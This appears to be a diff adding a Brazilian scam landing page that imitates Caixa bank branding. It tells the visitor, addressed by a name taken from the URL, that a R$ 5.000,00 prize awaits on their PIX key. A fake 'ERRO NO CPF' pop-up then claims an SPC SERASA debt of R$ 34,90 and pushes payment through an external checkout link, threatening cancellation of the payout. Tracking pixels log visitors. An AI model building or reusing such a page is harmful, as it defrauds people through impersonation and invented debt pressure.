@@ -1,0 +1,170 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <!-- Google tag (gtag.js) -->
+  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-KB0R572XG6"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-KB0R572XG6');
+  </script>
+  <script>
+  window.pixelId = "6908183506b66485dbf2e23f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Recebimento da Indenização</title>
+  <script>
+        localStorage.setItem("upsell", "up4");
+    </script><script>
+  window.pixelId = "692b50ba43f7b96eaa77880c";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'caixa-blue': '#015CA9',
+            'caixa-light-blue': '#049FD6',
+            'caixa-orange': '#F7931A',
+          }
+        }
+      }
+    }
+
+    function abrirModal() {
+      document.getElementById("modal").classList.remove("hidden")
+    }
+
+    function fecharModal() {
+      document.getElementById("modal").classList.add("hidden")
+    }
+
+    // Função para obter parâmetros da URL
+    function getUrlParameter(name) {
+      name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+      var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+      var results = regex.exec(location.search);
+      return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+    }
+
+    // Variável para o link de checkout
+    var checkoutUrl = 'https://go.transacaomarketplace.com/ss96eoklh1';
+
+    // Função para atualizar o nome na página
+    function atualizarNome() {
+      var nome = getUrlParameter('name');
+      if (nome) {
+        document.getElementById('nome-usuario').textContent = nome;
+      }
+    }
+
+    // Função para redirecionar para checkout com todos os parâmetros
+    function irParaCheckout() {
+      var urlAtual = window.location.href;
+      var urlBase = urlAtual.split('?')[0];
+      var parametros = window.location.search;
+
+      // Se não houver parâmetros, adiciona pelo menos o nome padrão
+      if (!parametros) {
+        parametros = '?name=Rafael dos Santos Silva';
+      }
+
+      var urlFinal = checkoutUrl + parametros; // Mantém o '?' inicial
+      window.location.href = urlFinal;
+    }
+
+    // Executar quando a página carregar
+    window.onload = function () {
+      atualizarNome();
+    }
+  </script>
+</head>
+
+<body>
+  <div class="bg-white w-full max-w-md rounded-lg">
+    <!-- Header -->
+    <div class="bg-gradient-to-b from-caixa-blue to-caixa-light-blue p-4 text-center">
+      <div class="flex justify-end items-center mb-6">
+        <img src="images/head-up2.png" alt="Brasil" class="h-8">
+      </div>
+      <h1 class="text-white font-bold text-lg">Recebimento do Prêmio</h1>
+      <p class="text-white text-sm mt-2">
+        Olá, <span id="nome-usuario" class="font-bold">Rafael dos Santos Silva</span>!<br>
+        Você está prestes a receber o seu valor de <span class="font-bold">R$ 5.000,00</span> na sua chave PIX!
+      </p>
+    </div>
+
+    <!-- Conteúdo -->
+    <div class="px-6 py-6">
+      <!-- Situação -->
+      <div class="text-center mb-6">
+        <p class="text-gray-600 font-medium">Situação:</p>
+        <p class="text-teal-600 font-bold text-lg">Saque Aprovado</p>
+      </div>
+
+      <!-- Ícone + linha vertical + texto -->
+      <div class="flex items-start justify-start gap-4 mb-8">
+        <div class="relative flex flex-col items-center">
+          <div class="absolute top-0 bottom-0 w-px border-1.5 bg-gray-300"></div>
+          <img src="images/icone1.png" alt="Ícone Indenização" class="z-10 w-6 h-20 object-contain">
+        </div>
+        <div class="flex-1">
+          <p class="font-semibold text-gray-800 text-sm mb-1">Seu prêmio está disponível!</p>
+          <p class="text-sm text-gray-700">
+            Clique no botão abaixo para confirmar as informações finais e prosseguir com o seu recebimento na sua chave
+            PIX cadastrada!
+          </p>
+        </div>
+      </div>
+
+      <!-- Botão para abrir o modal -->
+      <button onclick="abrirModal()" class="w-full bg-caixa-orange hover:bg-orange-500 text-white font-bold py-3 rounded-md text-center transition-colors">
+        CONFIRMAR
+      </button>
+    </div>
+  </div>
+
+  <!-- Modal -->
+  <div id="modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+    <div class="bg-white rounded-lg shadow-lg w-[90%] max-w-md p-6 text-center relative">
+      <!-- Conteúdo do Modal -->
+      <img src="images/image2.png" alt="SPC" class="mx-auto h-8 my-6">
+      <div class="flex items-center justify-center gap-2 my-4">
+        <img src="images/x.png" alt="SPC" class="h-6 mb-2">
+        <h2 class="text-red-600 font-bold text-lg mb-2 flex items-center justify-center gap-2">
+          ERRO NO CPF!
+        </h2>
+      </div>
+      <div class="bg-red-100 border border-red-300 text-red-800 px-4 py-2 rounded mb-4 text-sm">
+        Identificamos uma pendência com o <strong class="text-black">SPC SERASA</strong> de <strong class="text-red-500">R$ 34,90</strong>
+      </div>
+      <p class="text-sm mb-4">
+        Para realizarmos o saque de <span class="text-green-600 font-bold">R$ 5.000,00</span> é necessário que seu CPF
+        <strong>não tenha nenhuma pendência</strong>.
+      </p>
+      <p class="text-sm mb-6">
+        Efetue o pagamento da pendência clicando no botão abaixo e <strong>libere sua transferência.</strong>.
+      </p>
+      <button onclick="irParaCheckout()" class="w-full bg-blue-600 text-sm hover:bg-blue-700 text-white font-bold py-5 rounded-md mb-3">
+        REGULARIZAR CPF RAPIDAMENTE
+      </button>
+      <p class="text-xs text-red-600 my-4">
+        <strong>Atenção:</strong> <span class="text-black">Em casos de <strong>desistência da quitação</strong>, o seu
+          <strong>saque será cancelado</strong>.</span>
+      </p>
+    </div>
+  </div>
+
+
+</body></html>
